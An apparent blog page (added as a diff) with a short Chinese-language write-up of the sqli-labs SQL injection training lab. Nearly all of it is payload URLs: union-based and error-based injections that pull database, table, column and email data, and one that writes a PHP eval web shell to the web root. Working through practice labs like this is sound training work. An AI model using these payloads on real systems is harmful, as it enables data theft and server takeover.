@@ -1,0 +1,171 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>sqli-labs writeup | Dayu | sCRiPt n00b</title>
+
+  
+  <meta name="author" content="大宇">
+  
+
+  
+  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
+  
+
+  
+  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="sqli-labs writeup">
+
+  <meta property="og:site_name" content="Dayu">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Dayu</a>
+    </h1>
+    <p class="site-description">sCRiPt n00b</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/whoami">关于</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>sqli-labs writeup</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/sqli-labs-writeup.html" rel="bookmark">
+        <time class="entry-date published" datetime="2017-10-10T12:30:58.000Z">
+          2017-10-10
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>sqli-labs writeup</p>
+<a id="more"></a>
+<hr>
+<h3 id="less-1-4"><a href="#less-1-4" class="headerlink" title="less_1-4"></a>less_1-4</h3><ol>
+<li>加一个’，找到注入点：<code>http://127.0.0.1/Less-1/?id=1&#39;</code></li>
+<li>猜列数：<code>http://127.0.0.1/Less-1/?id=0&#39; order by 4--+</code></li>
+<li>union查询：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,3--+</code></li>
+<li>爆库名：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></li>
+<li>爆表名：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></li>
+<li>爆字段名：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;--+</code></li>
+<li>爆数据：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,concat_ws(char(32,58,32),id,email_id) from emails--+</code></li>
+</ol>
+<h3 id="less-5-6"><a href="#less-5-6" class="headerlink" title="less_5-6"></a>less_5-6</h3><ol>
+<li><p>爆security表名：    <code>http://127.0.0.1/Less-5/?id=1&#39; union select count(*), 1, concat(0x7e,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1), 0x7e, floor(rand()*2)) as q from information_schema.tables group by q--+</code></p>
+</li>
+<li><p>爆emails列名：<code>http://127.0.0.1/Less-5/?id=1&#39; union select count(*), 1, concat(0x7e, (select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0, 1), 0x7e, floor(rand()*2)) as q from information_schema.tables group by q--+</code></p>
+</li>
+</ol>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less_7"></a>Less_7</h3><ul>
+<li>写文件：<code>http://127.0.0.1/Less-7/?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[dayu]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;--+</code></li>
+</ul>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Web/">Web</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a><a href="/tags/writeup/">writeup</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 大宇
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-135378097-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  </div>
+</div>
+</body>
+</html>
